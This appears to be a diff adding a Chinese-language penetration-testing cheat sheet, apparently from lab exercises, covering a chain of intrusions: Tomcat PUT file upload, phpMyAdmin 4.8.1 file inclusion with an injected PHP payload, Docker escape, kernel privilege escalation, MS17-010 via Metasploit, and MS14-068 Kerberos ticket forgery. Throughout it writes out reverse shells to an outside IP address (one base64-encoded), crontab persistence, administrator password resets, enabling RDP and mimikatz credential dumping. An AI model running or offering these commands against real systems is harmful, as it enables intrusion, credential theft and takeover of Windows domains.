@@ -1,0 +1,91 @@
+cat /proc/1/status | grep Cap
+
+https://www.exploit-db.com/exploits/42953  tomcat  PUT
+
+PUT /1.jsp/ HTTP/1.1
+Host: 192.168.3.103:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://192.168.3.103:8080/examples/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2
+Cookie: JSESSIONID=A27674F21B3308B4D893205FD2E2BF94
+Connection: close
+Content-Length: 26
+    
+<% out.println("hello");%>
+
+https://www.exploit-db.com/exploits/42966
+Struc2
+
+bash -i >& /dev/tcp/116.62.32.64/8866 0>&1
+
+phpmyadmin 4.8.1 远程文件包含漏洞 利用
+http://192.168.1.188:2003/index.php?target=db_datadict.php%253f/../../../../../../
+tmp/sess_6dd19ff2088d22ac4b1bfb67db1a68a5
+
+select '<?php phpinfo();?>'
+旧版本：sess_ + session_id
+新版本：可能直接用 session_id，但历史场景中大量存在 sess_ 前缀的习惯。
+通常在/tmp
+sess_6dd19ff2088d22ac4b1bfb67db1a68a5
+6dd19ff2088d22ac4b1bfb67db1a68a5
+
+select '<?php system(base64_decode("YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMzIuNjQvODA4MCAwPiYxIg==")) ?>'
+
+docker逃逸
+https://github.com/cdk-team/CDK/wiki/CDK-Home-CN
+./cdk_linux_amd64 evaluate --full
+
+cat /proc/self/status | grep CapEff 查看是不是特权
+
+echo '* * * * * root bash -i >& /dev/tcp/192.168.1.175/8899 0>&1' > /niko/shrimp.sh
+echo '* * * * * root bash /niko/shrimp.sh' >> /niko/etc/crontab
+echo '* * * * * root bash -i >& /dev/tcp/116.62.32.64/8989 0>&1' >> /niko/etc/crontab
+
+最后公钥提权
+ ssh-keygen -t rsa
+
+内核提权
+git clone https://github.com/scumjr/dirtycow-vdso.git
+本地编译
+make
+wget 下载
+
+
+
+sudo apt-get install libqt5webenginewidgets5 libqt5websockets5
+sudo apt-get install nasm mingw-w64 
+yum install libqt5webenginewidgets5 libqt5websockets5
+
+use auxiliary/scanner/smb/smb_ms17_010
+set rhost 192.168.183.129
+setg Proxies socks5:116.62.32.64:36666 
+
+
+拿下win7
+set RhOSTs 192.168.183.129
+setg Proxies socks5:116.62.32.64:36666
+set payload windows/x64/meterpreter/bind_tcp
+set lport 5555
+run
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 打开3389
+net user administrator Admin12345
+net user administrator Admin12345 /active:yes  
+chcp 65001 
+mimikatz.exe
+sekurlsa::logonpasswords
+
+cd \Users\douser\Desktop
+load kiwi
+
+ms14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.131 -p Dotest123
+MS14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.131 -p Dotest123
+sekurlsa::logonpasswords
+mimikatz.exe
+kerberos::purge 清空
+kerberos::list
+kerberos::ptc "TGT_douser@DEMO.com.ccache"
+
+MS14-068（CVE-2014-6324） 是 Microsoft Windows 操作系统中的一个高危漏洞,影响 Kerberos 协议的权限验证机制。如果攻击者获取了域内任何一台计算机的shell权限，同时知道任意域用户的用户名、SID、密码，即可获取域管理员权限，未打补丁的 Windows Server 2003 至 2012 R2 域控制器都可能有该漏洞。
